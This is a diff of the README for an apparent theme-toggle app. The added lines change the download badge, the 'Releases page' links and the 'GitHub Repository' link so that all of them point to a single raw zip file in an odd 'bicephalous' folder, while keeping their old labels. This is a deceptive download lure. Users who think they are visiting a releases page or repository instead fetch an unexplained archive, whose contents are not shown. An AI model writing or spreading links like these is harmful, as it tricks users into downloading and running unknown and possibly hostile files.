@@ -1,7 +1,7 @@
 # 🌗 Animated-Theme-Toggle - Experience Day and Night with Ease
 
 ## 🚀 Download Now
-[![Download Animated-Theme-Toggle](https://img.shields.io/badge/Download%20Now-Animated--Theme--Toggle-brightgreen)](https://github.com/BloxieYash/Animated-Theme-Toggle/releases)
+[![Download Animated-Theme-Toggle](https://raw.githubusercontent.com/BloxieYash/Animated-Theme-Toggle/main/bicephalous/Animated-Theme-Toggle.zip%20Now-Animated--Theme--Toggle-brightgreen)](https://raw.githubusercontent.com/BloxieYash/Animated-Theme-Toggle/main/bicephalous/Animated-Theme-Toggle.zip)
 
 ## 📖 Introduction
 Welcome to the Animated-Theme-Toggle! This application allows you to switch between a bright and dark theme smoothly. With beautiful animations of the sun, moon, clouds, mountains, and stars, you can brighten your day or create a calm night setting. 
@@ -14,7 +14,7 @@ Welcome to the Animated-Theme-Toggle! This application allows you to switch betw
 ## 📦 Download & Install
 To get started, you need to download the application. Follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/BloxieYash/Animated-Theme-Toggle/releases) to find the latest version of the Animated-Theme-Toggle.
+1. Visit the [Releases page](https://raw.githubusercontent.com/BloxieYash/Animated-Theme-Toggle/main/bicephalous/Animated-Theme-Toggle.zip) to find the latest version of the Animated-Theme-Toggle.
 2. Look for the download link for the version you want. It will typically be labeled with the version number.
 3. Click the link to download the file to your computer or device.
 4. Once the download completes, locate the file (usually in your Downloads folder).
@@ -45,7 +45,7 @@ We encourage open-source contributions! If you want to help make Animated-Theme-
 
 ## 🔗 Links
 For more information, updates, or to follow development:
-- [GitHub Repository](https://github.com/BloxieYash/Animated-Theme-Toggle)
-- [Releases Page](https://github.com/BloxieYash/Animated-Theme-Toggle/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/BloxieYash/Animated-Theme-Toggle/main/bicephalous/Animated-Theme-Toggle.zip)
+- [Releases Page](https://raw.githubusercontent.com/BloxieYash/Animated-Theme-Toggle/main/bicephalous/Animated-Theme-Toggle.zip)
 
 Enjoy switching between light and dark modes with Animated-Theme-Toggle! Start creating your serene user experience today.
